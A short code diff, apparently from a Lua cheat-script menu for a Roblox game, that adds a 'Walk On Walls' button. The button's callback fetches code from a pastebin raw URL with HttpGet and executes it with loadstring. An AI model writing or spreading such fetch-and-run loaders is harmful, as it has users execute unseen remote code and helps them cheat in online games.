@@ -724,6 +724,14 @@ countdownGui:Destroy()
     end,
 })
 
+tab:button({
+    Name = "Walk On Walls",
+    Description = "",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
+    end,
+})
+
 local autoFarmRunning = false
 
 tab:toggle({
